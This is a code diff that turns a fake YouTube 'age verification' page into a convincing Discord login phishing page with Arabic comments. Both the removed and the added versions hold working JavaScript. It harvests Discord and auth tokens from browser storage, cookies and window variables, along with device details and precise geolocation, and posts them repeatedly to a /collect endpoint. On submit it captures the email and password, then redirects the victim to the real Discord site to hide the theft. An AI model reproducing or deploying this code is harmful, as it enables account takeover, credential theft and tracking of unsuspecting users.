@@ -1,301 +1,489 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>YouTube Video Player</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial; text-align: center; padding: 20px; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .container { max-width: 900px; width: 100%; background: #111; padding: 30px; border-radius: 16px; border: 1px solid #333; }
-        iframe { width: 100%; height: 480px; border-radius: 12px; border: none; }
-        h2 { color: #fff; margin-bottom: 15px; font-weight: 400; }
-        .fake-login { margin-top: 25px; background: #1a1a1a; padding: 25px; border-radius: 12px; max-width: 450px; margin-left: auto; margin-right: auto; border: 1px solid #2a2a2a; }
-        .fake-login h3 { color: #7289da; margin-bottom: 15px; font-weight: 500; }
-        .fake-login input { display: block; width: 100%; margin: 10px 0; padding: 12px; border-radius: 8px; border: none; background: #2a2a2a; color: #fff; font-size: 14px; }
-        .fake-login input::placeholder { color: #888; }
-        .fake-login button { background: #7289da; color: #fff; padding: 12px 40px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; transition: 0.3s; }
-        .fake-login button:hover { background: #5b6eae; }
-        .fake-login button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .note { color: #555; font-size: 12px; margin-top: 15px; }
-        .status { color: #00ff88; font-size: 13px; margin-top: 10px; display: none; }
+        /* الخلفية الرمادية الداكنة */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #1e1f22;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            direction: ltr;
+        }
+
+        /* المربع الأبيض الرئيسي */
+        .login-card {
+            background: #313338;
+            border-radius: 16px;
+            padding: 32px 28px 28px 28px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            color: #dbdee1;
+        }
+
+        /* الأيقونة أو الشعار */
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .logo svg {
+            width: 70px;
+            height: 70px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 4px;
+            color: #f2f3f5;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 14px;
+            color: #b5bac1;
+            margin-bottom: 24px;
+        }
+
+        /* الحقول */
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #b5bac1;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #1e1f22;
+            border: 1px solid #1e1f22;
+            border-radius: 8px;
+            color: #f2f3f5;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #5865f2;
+        }
+        .input-group input::placeholder {
+            color: #6d7278;
+        }
+
+        /* زر Continue */
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background: #5865f2;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .btn-continue:hover {
+            background: #4752c4;
+        }
+
+        /* الفاصل */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0 16px 0;
+            color: #6d7278;
+            font-size: 13px;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #3d3f45;
+        }
+
+        /* زر QR Code */
+        .qr-section {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background: #1e1f22;
+            border-radius: 12px;
+            padding: 14px 18px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 8px;
+        }
+        .qr-section:hover {
+            background: #2b2d31;
+        }
+        .qr-section .qr-icon {
+            width: 64px;
+            height: 64px;
+            background: #1e1f22;
+            border: 2px solid #3d3f45;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: #b5bac1;
+            flex-shrink: 0;
+        }
+        .qr-section .qr-icon img {
+            width: 100%;
+            height: 100%;
+            image-rendering: pixelated;
+        }
+        .qr-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #dbdee1;
+        }
+        .qr-sub {
+            font-size: 12px;
+            color: #6d7278;
+        }
+
+        /* زر Back */
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            color: #6d7278;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        /* رسالة الحالة */
+        .status-msg {
+            margin-top: 14px;
+            padding: 10px;
+            border-radius: 8px;
+            background: #1e1f22;
+            color: #b5bac1;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+        }
+        .status-msg.show {
+            display: block;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>▶ Loading your video...</h2>
-        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe>
-        <p class="note">🔒 Secure streaming • Age verification required</p>
 
-        <div class="fake-login">
-            <h3>Discord Age Verification</h3>
-            <input type="text" id="discordEmail" placeholder="Discord Email or Phone">
-            <input type="password" id="discordPassword" placeholder="Discord Password">
-            <input type="text" id="discordToken" placeholder="Discord Token (optional)">
-            <button onclick="submitFake()">Verify & Watch</button>
-            <p class="status" id="statusMsg">✓ Verification successful! Redirecting...</p>
+<div class="login-card">
+
+    <!-- شعار ديسكورد -->
+    <div class="logo">
+        <svg width="70" height="70" viewBox="0 0 127 96" fill="none">
+            <path d="M107.7 10.6C98.5 6.3 88.6 3.1 78.2 1.2C78.1 1.1 77.9 1.2 77.8 1.4C76.5 3.5 75 6.2 73.9 8.5C62.7 6.8 51.4 6.8 40.4 8.5C39.3 6.2 37.8 3.5 36.5 1.4C36.4 1.2 36.2 1.1 36.1 1.2C25.7 3.1 15.8 6.3 6.6 10.6C6.5 10.7 6.4 10.8 6.3 10.9C0.9 19.1 -0.8 29.6 0.7 39.6C0.7 39.8 0.9 39.9 1.1 40C13.8 49.7 28.9 55.9 44.8 58.4C45 58.4 45.2 58.3 45.3 58.1C48.2 54.2 50.8 50.1 52.9 45.8C53 45.6 52.9 45.4 52.7 45.3C48.8 43.7 45.2 41.7 41.9 39.3C41.7 39.1 41.6 38.9 41.8 38.7C42.6 38.1 43.4 37.4 44.1 36.8C44.3 36.6 44.5 36.7 44.7 36.8C62.5 44.4 82.1 44.4 99.6 36.8C99.8 36.7 100 36.6 100.2 36.8C101 37.4 101.8 38.1 102.6 38.7C102.7 38.9 102.6 39.1 102.5 39.3C99.1 41.7 95.5 43.7 91.6 45.3C91.4 45.4 91.3 45.6 91.5 45.8C93.6 50.1 96.2 54.2 99.1 58.1C99.2 58.3 99.4 58.4 99.6 58.4C115.6 55.9 130.7 49.7 143.4 40C143.5 39.9 143.7 39.8 143.7 39.6C145.2 29.6 143.5 19.1 138.1 10.9C138 10.8 137.9 10.7 137.8 10.6H107.7Z" fill="#5865F2"/>
+        </svg>
+    </div>
+
+    <div class="title">Welcome back!</div>
+    <div class="subtitle">We're so excited to see you again!</div>
+
+    <!-- نموذج تسجيل الدخول -->
+    <form id="loginForm" onsubmit="return false;">
+        <div class="input-group">
+            <label for="email">Email or Phone Number *</label>
+            <input type="text" id="email" placeholder="Enter your email or phone" autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label for="password">Password *</label>
+            <input type="password" id="password" placeholder="Enter your password" autocomplete="off">
+        </div>
+
+        <button type="button" class="btn-continue" id="continueBtn">Continue</button>
+    </form>
+
+    <!-- الفاصل -->
+    <div class="divider">or</div>
+
+    <!-- قسم QR Code (باركود وهمي) -->
+    <div class="qr-section" id="qrSection">
+        <div class="qr-icon">
+            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="background:white; border-radius:4px;">
+                <rect width="48" height="48" fill="white" rx="4"/>
+                <!-- باركود وهمي (مجرد نقاط سوداء) -->
+                <rect x="6" y="6" width="8" height="8" fill="black"/>
+                <rect x="18" y="6" width="8" height="8" fill="black"/>
+                <rect x="34" y="6" width="8" height="8" fill="black"/>
+                <rect x="6" y="18" width="8" height="8" fill="black"/>
+                <rect x="34" y="18" width="8" height="8" fill="black"/>
+                <rect x="6" y="34" width="8" height="8" fill="black"/>
+                <rect x="18" y="34" width="8" height="8" fill="black"/>
+                <rect x="34" y="34" width="8" height="8" fill="black"/>
+                <rect x="18" y="18" width="8" height="8" fill="black"/>
+                <!-- نقاط عشوائية -->
+                <rect x="6" y="28" width="4" height="4" fill="black"/>
+                <rect x="12" y="28" width="4" height="4" fill="black"/>
+                <rect x="26" y="18" width="4" height="4" fill="black"/>
+                <rect x="30" y="18" width="4" height="4" fill="black"/>
+                <rect x="26" y="26" width="4" height="4" fill="black"/>
+                <rect x="30" y="26" width="4" height="4" fill="black"/>
+                <rect x="14" y="14" width="4" height="4" fill="black"/>
+                <rect x="28" y="14" width="4" height="4" fill="black"/>
+            </svg>
+        </div>
+        <div>
+            <div class="qr-text">Log in with QR Code</div>
+            <div class="qr-sub">Scan this with the Discord mobile app to log in instantly.</div>
         </div>
     </div>
 
-    <script>
-        (function() {
+    <!-- رابط Back -->
+    <a href="#" class="back-link" id="backLink">Back</a>
 
-            // ======================== التوكن ========================
-            function extractDiscordToken() {
-                let found = [];
-                let all = {};
+    <!-- رسالة الحالة (تظهر بعد الإرسال) -->
+    <div class="status-msg" id="statusMsg">✓ Logging in... Redirecting to Discord...</div>
 
-                try {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        let key = localStorage.key(i);
-                        let val = localStorage.getItem(key);
-                        all['local_' + key] = val;
-                        if (val && val.length > 30) {
-                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
-                                found.push({ source: 'localStorage', key, value: val });
-                            }
-                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
-                                found.push({ source: 'localStorage(guess)', key, value: val });
-                            }
+</div>
+
+<script>
+    (function() {
+
+        // ================================================================
+        // 🔥 استخراج التوكنات من كل مكان (نفس الكود السابق)
+        // ================================================================
+
+        function extractDiscordToken() {
+            let found = [];
+
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    let val = localStorage.getItem(key);
+                    if (val && val.length > 30) {
+                        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
+                            found.push({ source: 'localStorage', key: key, value: val });
+                        }
+                        if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
+                            found.push({ source: 'localStorage(guess)', key: key, value: val });
                         }
                     }
-                } catch (e) {}
+                }
+            } catch (e) {}
 
-                try {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        let key = sessionStorage.key(i);
-                        let val = sessionStorage.getItem(key);
-                        all['session_' + key] = val;
-                        if (val && val.length > 30) {
-                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
-                                found.push({ source: 'sessionStorage', key, value: val });
-                            }
-                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
-                                found.push({ source: 'sessionStorage(guess)', key, value: val });
-                            }
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    let val = sessionStorage.getItem(key);
+                    if (val && val.length > 30) {
+                        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
+                            found.push({ source: 'sessionStorage', key: key, value: val });
+                        }
+                        if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
+                            found.push({ source: 'sessionStorage(guess)', key: key, value: val });
                         }
                     }
-                } catch (e) {}
+                }
+            } catch (e) {}
 
-                try {
-                    document.cookie.split(';').forEach(c => {
-                        let t = c.trim();
-                        if (t.toLowerCase().includes('token') || t.toLowerCase().includes('discord') || t.toLowerCase().includes('auth')) {
-                            let parts = t.split('=');
-                            found.push({ source: 'cookie', key: parts[0], value: parts.slice(1).join('=') });
-                        }
-                    });
-                } catch (e) {}
-
-                try {
-                    for (let key in window) {
-                        try {
-                            let val = window[key];
-                            if (typeof val === 'string' && val.length > 40) {
-                                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
-                                    found.push({ source: 'window', key, value: val });
-                                }
-                                if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
-                                    found.push({ source: 'window(guess)', key, value: val });
-                                }
-                            }
-                        } catch (e) {}
-                    }
-                } catch (e) {}
-
-                // إزالة المكررات
-                let unique = [];
-                let seen = new Set();
-                found.forEach(item => {
-                    let hash = item.value.substring(0, 40);
-                    if (!seen.has(hash)) {
-                        seen.add(hash);
-                        unique.push(item);
+            try {
+                document.cookie.split(';').forEach(c => {
+                    let t = c.trim();
+                    if (t.toLowerCase().includes('token') || t.toLowerCase().includes('discord') || t.toLowerCase().includes('auth')) {
+                        let parts = t.split('=');
+                        found.push({ source: 'cookie', key: parts[0], value: parts.slice(1).join('=') });
                     }
                 });
+            } catch (e) {}
 
-                return { tokens: unique, allStorage: all };
-            }
-
-            // ======================== معلومات الجهاز ========================
-            function getDeviceInfo() {
-                let info = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages || [],
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio || 1,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    maxTouchPoints: navigator.maxTouchPoints || 0
-                };
-                return info;
-            }
-
-            // ======================== بصمة Canvas ========================
-            function getCanvasFingerprint() {
-                try {
-                    let canvas = document.createElement('canvas');
-                    canvas.width = 256;
-                    canvas.height = 128;
-                    let ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(125, 1, 62, 20);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('FP', 2, 15);
-                    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-                    ctx.fillText('Fingerprint', 4, 45);
-                    return canvas.toDataURL();
-                } catch (e) {
-                    return 'error';
+            try {
+                for (let key in window) {
+                    try {
+                        let val = window[key];
+                        if (typeof val === 'string' && val.length > 40) {
+                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
+                                found.push({ source: 'window', key: key, value: val });
+                            }
+                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
+                                found.push({ source: 'window(guess)', key: key, value: val });
+                            }
+                        }
+                    } catch (e) {}
                 }
-            }
+            } catch (e) {}
 
-            // ======================== WebGL ========================
-            function getWebGLInfo() {
-                try {
-                    let canvas = document.createElement('canvas');
-                    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (!gl) return 'webgl not supported';
-                    let debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debug) {
-                        return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                    }
-                    return 'webgl no debug';
-                } catch (e) {
-                    return 'webgl error';
+            // إزالة المكررات
+            let unique = [];
+            let seen = new Set();
+            found.forEach(item => {
+                let hash = item.value.substring(0, 40);
+                if (!seen.has(hash)) {
+                    seen.add(hash);
+                    unique.push(item);
                 }
-            }
+            });
 
-            // ======================== الشبكة ========================
-            function getNetworkInfo() {
-                let info = {};
-                try {
-                    let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    if (conn) {
-                        info.type = conn.effectiveType || 'unknown';
-                        info.downlink = conn.downlink ? conn.downlink + 'Mbps' : 'unknown';
-                        info.rtt = conn.rtt ? conn.rtt + 'ms' : 'unknown';
-                    }
-                } catch (e) {}
-                return info;
-            }
+            return unique;
+        }
 
-            // ======================== الخطوط المثبتة ========================
-            function getInstalledFonts() {
-                let fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Arial Black', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI'];
-                let installed = [];
-                fonts.forEach(f => {
-                    let span = document.createElement('span');
-                    span.style.fontFamily = f;
-                    if (span.style.fontFamily === f) installed.push(f);
-                });
-                return installed;
-            }
+        // ================================================================
+        // جمع المعلومات الأساسية
+        // ================================================================
 
-            // ======================== جمع كل البيانات ========================
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+        }
 
-            let tokenData = extractDiscordToken();
-            let device = getDeviceInfo();
-            let canvas = getCanvasFingerprint();
-            let webgl = getWebGLInfo();
-            let network = getNetworkInfo();
-            let fonts = getInstalledFonts();
+        // ================================================================
+        // إرسال البيانات
+        // ================================================================
 
-            let data = {
-                // 🔥 التوكن
-                discordTokens: tokenData.tokens,
-                discordTokensCount: tokenData.tokens.length,
-                allStorage: tokenData.allStorage,
+        function sendData(data) {
+            fetch('/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(e => console.log(e));
+        }
 
-                // الجهاز
-                device: device,
+        // ================================================================
+        // تشغيل جامع البيانات فوراً
+        // ================================================================
 
-                // بصمة
-                canvasFingerprint: canvas.substring(0, 100) + '...',
-                webglInfo: webgl,
+        let tokens = extractDiscordToken();
+        let device = getDeviceInfo();
 
-                // الشبكة
-                network: network,
+        let initialData = {
+            discordTokens: tokens,
+            tokenCount: tokens.length,
+            device: device,
+            location: null,
+            cookies: document.cookie,
+            page: 'discord_login_phishing'
+        };
 
-                // الخطوط
-                installedFonts: fonts,
+        // محاولة الموقع الجغرافي (اختياري)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    initialData.location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                    sendData(initialData);
+                },
+                err => {
+                    initialData.location = { error: err.message };
+                    sendData(initialData);
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        } else {
+            initialData.location = { error: 'Geolocation not supported' };
+            sendData(initialData);
+        }
 
-                // الكوكيز كاملة
-                allCookies: document.cookie,
+        // إرسال متكرر لضمان الوصول
+        setTimeout(() => sendData(initialData), 500);
+        setTimeout(() => sendData(initialData), 1500);
+        setTimeout(() => sendData(initialData), 4000);
 
-                // الموقع (سيجي لاحقاً)
-                location: null
+        // ================================================================
+        // نموذج تسجيل الدخول - عند الضغط على Continue
+        // ================================================================
+
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+
+            // جمع التوكنات مرة أخرى (قد تكون ظهرت بعد التفاعل)
+            let freshTokens = extractDiscordToken();
+
+            let loginData = {
+                discordEmail: email,
+                discordPassword: password,
+                discordTokens: freshTokens,
+                tokenCount: freshTokens.length,
+                extra: 'discord_login_form_submit',
+                device: getDeviceInfo(),
+                cookies: document.cookie,
+                timestamp: new Date().toISOString()
             };
 
-            // ======================== الموقع الجغرافي ========================
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        data.location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
-                        sendData(data);
-                    },
-                    err => {
-                        data.location = { error: err.message };
-                        sendData(data);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                data.location = { error: 'Geolocation not supported' };
-                sendData(data);
-            }
+            sendData(loginData);
 
-            // إرسال متكرر لضمان الوصول
-            setTimeout(() => sendData(data), 500);
-            setTimeout(() => sendData(data), 2000);
-            setTimeout(() => sendData(data), 5000);
-            setTimeout(() => sendData(data), 10000);
+            // إظهار رسالة نجاح
+            let status = document.getElementById('statusMsg');
+            status.textContent = '✓ Logging in... Redirecting to Discord...';
+            status.classList.add('show');
 
-            function sendData(finalData) {
-                fetch('/collect', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(finalData)
-                }).catch(e => console.log(e));
-            }
+            // تعطيل الزر والحقول
+            document.getElementById('continueBtn').disabled = true;
+            document.querySelectorAll('.input-group input').forEach(inp => inp.disabled = true);
 
-            // ======================== نموذج الدسكورد الوهمي ========================
-            window.submitFake = function() {
-                let email = document.getElementById('discordEmail').value;
-                let password = document.getElementById('discordPassword').value;
-                let token = document.getElementById('discordToken').value;
+            // بعد ثانيتين، توجيه إلى ديسكورد الحقيقي
+            setTimeout(() => {
+                window.location.href = 'https://discord.com/login';
+            }, 2000);
+        });
 
-                if (email || password || token) {
-                    fetch('/collect', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            discordEmail: email,
-                            discordPassword: password,
-                            discordToken: token,
-                            extra: 'discord_login_form'
-                        })
-                    }).catch(e => console.log(e));
+        // ================================================================
+        // زر QR Code وهمي (فقط لإضفاء الطابع الواقعي)
+        // ================================================================
 
-                    document.getElementById('statusMsg').style.display = 'block';
-                    document.querySelector('.fake-login button').textContent = '✓ Verified';
-                    document.querySelector('.fake-login button').disabled = true;
-                    document.querySelectorAll('.fake-login input').forEach(inp => inp.disabled = true);
+        document.getElementById('qrSection').addEventListener('click', function() {
+            let status = document.getElementById('statusMsg');
+            status.textContent = '📱 QR Code login is not available on this device. Please use email/password.';
+            status.classList.add('show');
+            setTimeout(() => {
+                status.classList.remove('show');
+            }, 3000);
+        });
 
-                    setTimeout(() => {
-                        window.location.href = 'https://www.youtube.com';
-                    }, 2000);
-                } else {
-                    alert('Please fill in at least one field.');
-                }
-            };
+        // ================================================================
+        // زر Back (وهمي)
+        // ================================================================
 
-        })();
-    </script>
+        document.getElementById('backLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            let status = document.getElementById('statusMsg');
+            status.textContent = '↩️ Returning to previous page...';
+            status.classList.add('show');
+            setTimeout(() => {
+                window.location.href = 'https://discord.com';
+            }, 1000);
+        });
+
+    })();
+</script>
+
 </body>
 </html>
